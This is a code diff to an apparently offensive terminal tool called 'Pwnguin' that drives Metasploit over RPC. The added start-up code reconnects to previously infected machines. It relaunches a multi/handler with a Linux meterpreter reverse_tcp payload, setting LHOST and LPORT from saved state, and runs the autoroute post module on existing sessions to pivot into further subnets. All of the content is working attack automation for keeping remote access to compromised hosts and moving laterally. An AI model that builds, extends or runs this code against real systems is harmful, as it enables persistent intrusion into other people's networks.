@@ -439,7 +439,8 @@ class ParamMenu(Static):
         client: MsfRpcClient = STATE["client"]
         exploit = STATE["exploit_ms"]
         payload = STATE["payload_ms"]
-        exploit.execute(payload=payload)
+        job = exploit.execute(payload=payload)
+        print(job)
         while len(client.jobs.list) != 0:
             pass
         new_sessions = client.sessions.list
@@ -709,19 +710,52 @@ class Pwnguin(App):
         # load save
         loaded = computer.load()
         STATE["computers"] = loaded
+
         # add local interfaces
         for inter in postexploit.getTargetConnections():
             STATE["computers"][inter[1]] = STATE["computers"].get(
                 inter[1], Computer(is_local=True)
             )
         self.app.call_from_thread(self.query_one(Tile4).rebuild_tree)
+
         # start metasploit
         client = autopwn.runMetasploit(reinit=True, show=False, wait=False)
         STATE["client"] = client
+
         # Open Control Server
         STATE["ctrlservproc"], STATE["ctrlservport"] = postexploit.openCtrlSrv(
             show=False
         )
+
+        # reconnect from infected
+        logs = self.query_one("#logs", Pretty)
+        paramMenu = self.query_one(ParamMenu)
+        actions = computer.actions_to_reconnect(loaded)
+        exploit = client.modules.use("exploit", "multi/handler")
+        payload = client.modules.use("payload", "linux/x86/meterpreter/reverse_tcp")
+        STATE["exploit_ms"] = exploit
+        STATE["payload_ms"] = payload
+        autoroute = client.modules.use("post", "multi/manage/autoroute")
+        for action in actions:
+            action_l = action.split(" ")
+            if action_l[0] == "reconnect":
+                self.call_from_thread(logs.update, "reconnecting " + action_l[1])
+                payload["LHOST"] = action_l[3].split("/")[0]
+                payload["LPORT"] = action_l[6]
+                task = self.call_from_thread(paramMenu.launch_attack, action_l[3])
+                while task.is_running:
+                    pass
+            else:
+                self.call_from_thread(logs.update, "adding route to" + action_l[1])
+                autoroute["SUBNET"] = action_l[1]
+                print(action_l[3].split("/")[0])
+                print(autopwn.findShellID(client, action_l[3].split("/")[0]))
+                autoroute["SESSION"] = int(
+                    autopwn.findShellID(client, action_l[3].split("/")[0])
+                )
+                job = autoroute.execute()
+                print(job)
+                sleep(2)
 
         self.app.call_from_thread(self.end_init)
 
